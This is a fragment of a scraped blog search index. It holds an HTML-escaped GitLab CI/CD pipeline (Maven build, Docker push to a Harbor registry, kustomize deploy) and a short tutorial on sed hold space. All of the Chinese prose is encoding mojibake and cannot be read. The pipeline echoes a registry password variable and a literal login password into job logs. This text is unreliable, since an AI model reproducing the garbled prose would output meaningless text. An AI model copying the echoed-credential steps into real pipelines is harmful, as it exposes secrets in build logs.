class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttps_proxy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eno_proxy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ecache\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003e.m2/repository/\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003etarget/\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003estages\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"l\"\u003ebuild\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"l\"\u003epush\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"l\"\u003edeploy\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eBuild\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003estage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ebuild\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003emaven:3.5-jdk-8-alpine\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ebefore_script\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eexport COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho $COMMIT_TIME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho \u0026#34;COMMIT_TIME=$COMMIT_TIME\u0026#34; \u0026gt;\u0026gt; build.env\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003e./mvnw package\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eartifacts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ereports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003edotenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ebuild.env\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etags\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eyunwei\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ePush\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003estage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003epush\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ebefore_script\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker info || true\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho \u0026#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho \u0026#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker pull $HARBOR_REGISTRY_IMAGE:latest || true\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"sd\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      docker build\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --cache-from $HARBOR_REGISTRY_IMAGE:latest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --build-arg http_proxy=$http_proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --build-arg https_proxy=$https_proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --build-arg no_proxy=$no_proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --cache-from HARBOR_REGISTRY_IMAGE:latest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --tag $HARBOR_REGISTRY_IMAGE:latest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      .\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker push $HARBOR_REGISTRY_IMAGE:latest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker logout $HARBOR_REGISTRY\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003edependencies\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eBuild\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etags\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eyunwei\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eDeploy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003estage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003edeploy\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ecache\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e{}\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ecnych/kustomize:v1.0\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho $COMMIT_TIME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit config --global user.email \u0026#34;gitlab@git.k8s.local\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit config --global user.name \u0026#34;GitLab CI/CD\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit clone git://172.18.31.50:30000/test-k8s.git\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003ecd test-k8s/prod\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003ekustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003ecat kustomization.yaml\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit commit -am \u0026#39;PROD image update\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit push origin master\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003edependencies\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eBuild\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etags\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eyunwei\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eonly\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003emaster\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ewhen\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003emanual\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…ˆä¸ç€æ€¥çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå†æ™®åŠä¸€ä¸‹ gitlab çš„è¿è¡Œæœºåˆ¶ï¼Œå®ƒæ˜¯é€šè¿‡ gitlab-runner æ¥æ‰§è¡Œcdçš„è¿‡ç¨‹çš„ã€‚é…ç½®gitlab runnerå…¶å®ä¹Ÿæ˜¯ä¸€é¡¹éå¸¸å¤æ‚çš„å·¥ä½œï¼Œé‡Œé¢å¯ä»¥é…çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸æ˜¯æœ¬ç¯‡çš„èŒƒç•´ã€‚æˆ‘ä»¬è¿™é‡Œç®€å•æ¥è¯´ï¼Œrunnerå°±æ˜¯ä¸€ä¸ªDockerå®¹å™¨ã€‚æ›´å‡†ç¡®çš„è¯´ï¼Œå°±æ˜¯Docker in Dockerã€‚\u003c/p\u003e","title":"Gitlabçš„CICDå®é™…ç”Ÿäº§ç¯å¢ƒåº”ç”¨"},{"content":"sed å’Œ awk ä»¥åŠ cut ç®—æ˜¯å¸¸ç”¨å·¥å…·äº†ï¼Œsedçš„é«˜çº§ç”¨æ³•ä¹Ÿéœ€è¦çŸ¥é“ä¸€ä¸‹\nsed é‡Œé¢æœ‰2ä¸ªç©ºé—´ï¼Œä¸€ä¸ªæ˜¯pattern spaceï¼Œä¸€ä¸ªæ˜¯hold spaceï¼Œé»˜è®¤éƒ½æ˜¯ç©ºçš„\nå¼€å§‹å¤„ç†çš„æ—¶å€™ï¼Œå°±ä»æ–‡ä»¶é‡Œä¸€è¡Œä¸€è¡Œè¯»å…¥ pattern space ï¼Œè¿›è¡Œå¤„ç†ï¼Œhold space åªåœ¨ä½ éœ€è¦ç”¨åˆ°å®ƒçš„æ—¶å€™æ‰ä¼šå‡ºç°ï¼š\nd ï¼š æ¸…ç©ºpattern spaceä¸­çš„å†…å®¹ï¼Œç«‹å³å¼€å§‹ä¸‹ä¸ªå¾ªç¯(æ„æ€æ˜¯è·³è¿‡é»˜è®¤çš„è¾“å‡ºpattern spaceå†…å®¹çš„é˜¶æ®µï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥ç†è§£çš„å¯¹ä¸å¯¹)\rh ï¼š ç”¨pattern spaceä¸­çš„å†…å®¹æ›¿æ¢hold patternä¸­çš„å†…å®¹\rH ï¼š åœ¨hold spaceä¸­çš„å†…å®¹åé¢è¿½åŠ ä¸€ä¸ªæ¢è¡Œï¼ŒæŠŠpattern spaceä¸­çš„å†…å®¹è¿½åŠ åˆ°hold spaceä¸­\rg ï¼š ç”¨hold spaceä¸­çš„å†…å®¹æ›¿æ¢pattern spaceä¸­çš„å†…å®¹\rG ï¼š åœ¨pattern spaceä¸­çš„å†…å®¹åé¢è¿½åŠ ä¸€ä¸ªæ¢è¡Œï¼ŒæŠŠhold spaceä¸­çš„å†…å®¹è¿½åŠ åˆ°pattern spaceä¸­\rh, gä¼šæ›¿æ¢ï¼ˆå¯ä»¥ç†è§£ä¸ºå…ˆæ¸…ç©ºï¼Œå†å¤åˆ¶ï¼‰, H, Gæ˜¯è¿½åŠ ã€‚ hHæ˜¯æ”¾è¿‡å»ï¼ŒgGæ˜¯æ‹¿è¿‡æ¥ï¼Œå°å†™æ˜¯æ›¿æ¢ï¼Œå¤§å†™æ˜¯è¿½åŠ \nåˆ†æä¸€ä¸‹ç»å…¸çš„å°†æ–‡ä»¶å†…å®¹åå‘æ‰“å°\ncat 1.txt\r1\r2\r3\rcat 1.txt | sed -n \u0026#39;1!G;h;$p\u0026#39;\r3\r2\r1 \u0026lsquo;1!G;h;$p\u0026rsquo; åˆ†æä¸€ä¸‹ï¼Œ1!Gå°±æ˜¯è¯´ç¬¬ä¸€è¡Œä¸æ‰§è¡ŒGï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹æ‰§è¡ŒGï¼›ç„¶åhæ˜¯æ¯è¡Œéƒ½æ‰§è¡Œï¼Œæœ€åä¸€è¡Œçš„æ—¶å€™æ‰§è¡Œp\ninput | pattern | hold | command | pattern | hold | command | pattern | hold\r1 | 1 | ç©ºè¡Œ | | 1 | ç©ºè¡Œ | h | 1 | 1\r2 | 2 | 1 | G | 21 | 1 | h | 21 | 21\r3 | 3 | 21 | G | 321 | 21 | h | 321 | 321 å› ä¸ºä¹‹å‰çš„å‚æ•°æ˜¯ -n ä¸æ‰“å°ï¼Œç›´åˆ°æœ€åä¸€è¡Œï¼Œ$pæ‰“å°Patternç©ºé—´é‡Œçš„å†…å®¹ï¼Œè¿™æ ·å°±ç›´æ¥è¢«åè½¬æ‰“å°å‡ºæ¥äº†ã€‚\nã€‚\n","permalink":"https://rendoumi.com/posts/20221024-sed_advanced/","summary":"\u003cp\u003esed å’Œ awk ä»¥åŠ cut ç®—æ˜¯å¸¸ç”¨å·¥å…·äº†ï¼Œsedçš„é«˜çº§ç”¨æ³•ä¹Ÿéœ€è¦çŸ¥é“ä¸€ä¸‹\u003c/p\u003e\n\u003cp\u003esed é‡Œé¢æœ‰2ä¸ªç©ºé—´ï¼Œä¸€ä¸ªæ˜¯pattern spaceï¼Œä¸€ä¸ªæ˜¯hold 